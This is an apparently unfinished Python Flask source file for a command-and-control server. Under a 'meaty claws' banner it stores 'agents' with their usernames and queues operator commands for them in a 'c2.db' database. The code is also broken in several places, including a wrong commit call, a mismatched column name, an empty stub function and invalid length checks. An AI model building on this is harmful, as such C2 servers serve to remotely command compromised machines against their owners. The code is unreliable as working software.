from flask import Flask, request, jsonify
from flask_sqlalchemy import SQLAlchemy


def banner():
    x = r"""                      _                _                    
                     | |              | |                   
 _ __ ___   ___  __ _| |_ _   _    ___| | __ ___      _____ 
| '_ ` _ \ / _ \/ _` | __| | | |  / __| |/ _` \ \ /\ / / __|
| | | | | |  __/ (_| | |_| |_| | | (__| | (_| |\ V  V /\__ \
|_| |_| |_|\___|\__,_|\__|\__, |  \___|_|\__,_| \_/\_/ |___/
                           __/ |                            
                          |___/                             """
    print(x)
app = Flask(__name__)
#sqlite:///:memory: (or, sqlite://)
#sqlite:///relative/path/to/file.db
#sqlite:////absolute/path/to/file.db
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///c2.db'
db = SQLAlchemy(app)


# tasks 
CREATED = "CREATED"
TASKED = "TASKED"
DONE = "DONE"

class Task(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    agent_id = db.Column(db.Integer)
    command = db.Column(db.String)
    status = db.Column(db.String)

class Agent(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    agent_id = db.Column(db.String)
    username = db.Column(db.String)
    

def find_agent_by_id(id_):
    return Agent.query.filter_by(id=id_).first()

@app.route("/register")
def register():
    reg_data = request.json
    whoami = reg_data.get("whoami")
    agent_id = reg_data.get("agent_id")
    if whoami == "" or agent_id == "":
        return ""
    agent =  Agent(agent_id = agent_id, username=whoami)
    db.session.add(agent)
    db.commit()
    print(f"[+] New agent added: {agent_id} {whoami}")
    return jsonify({"status": "ok"})

def tasks():
    request.headers.get("")




@app.route("/tasks/create")
def create_task():
    req_data = request.json
    id_ = req_data.get("id")
    if id_ == "":
        return jsonify({"status": "Failed", "mesage": "Invlaid agent id"})

    cmd = req_data.get("cmd")
    if cmd == "":
        return jsonify({"status": "Failed", "mesage": "Invlaid cmd"})

    agent = find_agent_by_id(id_)
    if agent == None or len(agent) == 0:
        return jsonify({"status": "Failed", "mesage": "Invlaid agent id"})
    task = Task(agent_id = agent.id, cmd=cmd, status = CREATED)
    db.session.add(task)
    db.session.commit()
    print(f"[+] Created task {task.id} for {task.agent_id} ")
    return jsonify({"status":"ok", "message":task.id })

 

if __name__=="__main__":
    banner()
    app.run()